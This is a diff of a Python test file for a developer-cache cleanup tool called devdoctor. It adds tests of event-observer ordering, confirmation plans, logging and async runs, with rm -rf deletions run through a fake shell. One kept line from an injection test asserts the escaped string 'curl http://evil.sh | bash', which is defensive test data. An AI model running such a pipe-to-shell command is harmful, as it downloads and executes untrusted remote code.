@@ -1,8 +1,17 @@
 from datetime import UTC, datetime
 from pathlib import Path
 
+from devdoctor import cleanup
 from devdoctor.cleanup import build_script, run
-from devdoctor.types import CleanupOpts, Entry, Report, Risk, ShellResult
+from devdoctor.types import (
+    AdviceAction,
+    CleanupOpts,
+    DeletePathAction,
+    Entry,
+    Report,
+    Risk,
+    ShellResult,
+)
 from tests.conftest import FakeShell
 
 
@@ -15,7 +24,7 @@ def _report(*entries: Entry) -> Report:
     )
 
 
-def _e(provider, id_, size, risk=Risk.SAFE, recipe=None) -> Entry:
+def _e(provider, id_, size, risk=Risk.SAFE, recipe=None, actions=None) -> Entry:
     return Entry(
         provider=provider,
         id=id_,
@@ -25,6 +34,7 @@ def _e(provider, id_, size, risk=Risk.SAFE, recipe=None) -> Entry:
         mtime=None,
         risk=risk,
         recipe=recipe or [f"rm -rf /{id_}"],
+        actions=actions or (),
     )
 
 
@@ -307,3 +317,165 @@ def test_build_script_newline_in_filename_cannot_inject_uncommented_lines():
     # The content is still visible for review, just escaped onto one line.
     assert "curl http://evil.sh | bash" in script
     assert "\\n" in script
+
+
+def _events_of(report, opts, *, shell=None, prompt=None, confirm=None):
+    seen: list[object] = []
+    results = run(
+        report,
+        shell=shell or FakeShell(),
+        prompt_choice=prompt or (lambda entry: "y"),
+        confirm=confirm or (lambda msg: True),
+        opts=opts,
+        on_event=seen.append,
+    )
+    return seen, results
+
+
+def test_run_delivers_every_event_to_the_observer_in_order() -> None:
+    a = _e("a", "1", 100, actions=(DeletePathAction(Path("/1")),))
+    shell = FakeShell(responses={("rm", "-rf", "--", "/1"): ShellResult(0, "", "")})
+    seen, results = _events_of(_report(a), CleanupOpts(execute=True), shell=shell)
+
+    kinds = [type(e).__name__ for e in seen]
+    assert kinds == ["PromptRequired", "ConfirmRequired", "ExecuteStep", "EntryResolved"]
+    assert [r.status for r in results] == ["ok"]
+
+
+def test_confirm_required_carries_the_plan_in_execution_order() -> None:
+    small = _e("a", "small", 10, actions=(DeletePathAction(Path("/small")),))
+    big = _e("a", "big", 1000, actions=(DeletePathAction(Path("/big")),))
+    unknown = Entry(
+        provider="b",
+        id="hint",
+        path=Path("/hint"),
+        label="b/hint",
+        size_bytes=5,
+        mtime=None,
+        risk=Risk.SAFE,
+        recipe=[],
+        actions=(AdviceAction("run the tool yourself"),),
+        usage=None,
+    )
+    shell = FakeShell(
+        responses={
+            ("rm", "-rf", "--", "/small"): ShellResult(0, "", ""),
+            ("rm", "-rf", "--", "/big"): ShellResult(0, "", ""),
+        }
+    )
+    seen, _ = _events_of(
+        _report(small, big, unknown), CleanupOpts(execute=True, yes_safe=True), shell=shell
+    )
+
+    (confirm,) = [e for e in seen if isinstance(e, cleanup.ConfirmRequired)]
+    assert [p.entry.id for p in confirm.plan] == [e.id for e in confirm.approved]
+    by_id = {p.entry.id: p for p in confirm.plan}
+    assert by_id["small"].lines == ("rm -rf -- /small",)
+    assert by_id["small"].estimate_bytes == 10
+    assert by_id["hint"].lines == ("echo 'run the tool yourself'",)
+    assert by_id["hint"].estimate_bytes == 5
+    # Execution order: the plan's order is the order EntryResolved arrives in.
+    resolved = [e.result.entry_id for e in seen if isinstance(e, cleanup.EntryResolved)]
+    assert resolved == [p.entry.id for p in confirm.plan]
+
+
+def test_plan_is_empty_when_nothing_is_approved() -> None:
+    seen, _ = _events_of(
+        _report(_e("a", "1", 100)), CleanupOpts(execute=True), prompt=lambda e: "n"
+    )
+    assert not any(isinstance(e, cleanup.ConfirmRequired) for e in seen)
+
+
+class _RecordingLogger:
+    """Records `.warning(msg, *args)` calls the way `cleanup.logger` does.
+
+    A real logger under caplog only works when the `devdoctor` logger tree
+    still propagates to the root handler caplog installs; CLI tests
+    (`test_cli.py`) invoke `configure_logging`, which sets `propagate = False`
+    on the `devdoctor` logger for the rest of the process, so this test would
+    fail whenever it runs after one of those (order-dependent, and it does in
+    the full suite). Monkeypatching `cleanup.logger` with this recorder
+    sidesteps the logging tree entirely, so the test needs no assumption
+    about what ran before it.
+    """
+
+    def __init__(self) -> None:
+        self.warnings: list[str] = []
+
+    def warning(self, msg: str, *args: object, **kwargs: object) -> None:
+        self.warnings.append(msg % args if args else msg)
+
+
+def test_a_raising_observer_never_changes_the_run(monkeypatch) -> None:
+    a = _e("a", "1", 100, actions=(DeletePathAction(Path("/1")),))
+    shell = FakeShell(responses={("rm", "-rf", "--", "/1"): ShellResult(0, "", "")})
+    reference = run(
+        _report(a),
+        shell=shell,
+        prompt_choice=lambda e: "y",
+        confirm=lambda m: True,
+        opts=CleanupOpts(execute=True),
+    )
+
+    def bad(event: object) -> None:
+        raise ValueError("presenter bug")
+
+    fake_logger = _RecordingLogger()
+    monkeypatch.setattr(cleanup, "logger", fake_logger)
+    results = run(
+        _report(a),
+        shell=FakeShell(responses=shell.responses),
+        prompt_choice=lambda e: "y",
+        confirm=lambda m: True,
+        opts=CleanupOpts(execute=True),
+        on_event=bad,
+    )
+
+    assert [(r.entry_id, r.status) for r in results] == [(r.entry_id, r.status) for r in reference]
+    messages = [m for m in fake_logger.warnings if "cleanup observer" in m]
+    assert {m.split()[-1] for m in messages} == {
+        "PromptRequired",
+        "ConfirmRequired",
+        "ExecuteStep",
+        "EntryResolved",
+    }
+
+
+def test_confirm_summary_is_human_readable() -> None:
+    a = _e("a", "1", 5_600_000_000)
+    event = cleanup.ConfirmRequired(approved=[a], total_bytes=5_600_000_000, unknown_entries=0)
+    assert cleanup._confirm_summary(event) == "Execute these 1 entries (~5.2G estimated)?"
+    event = cleanup.ConfirmRequired(approved=[a, a], total_bytes=1024, unknown_entries=2)
+    assert (
+        cleanup._confirm_summary(event) == "Execute these 2 entries (~1.0K estimated, +2 unknown)?"
+    )
+
+
+async def test_run_async_delivers_events_to_the_observer() -> None:
+    a = _e("a", "1", 100)
+
+    async def run_line(argv):
+        return ShellResult(0, "", "")
+
+    async def prompt(entry):
+        return "y"
+
+    async def confirm(msg):
+        return True
+
+    seen: list[object] = []
+    results = await cleanup.run_async(
+        _report(a),
+        run_line=run_line,
+        prompt_choice=prompt,
+        confirm=confirm,
+        opts=CleanupOpts(execute=True),
+        on_event=seen.append,
+    )
+    assert [type(e).__name__ for e in seen] == [
+        "PromptRequired",
+        "ConfirmRequired",
+        "ExecuteStep",
+        "EntryResolved",
+    ]
+    assert [r.status for r in results] == ["ok"]
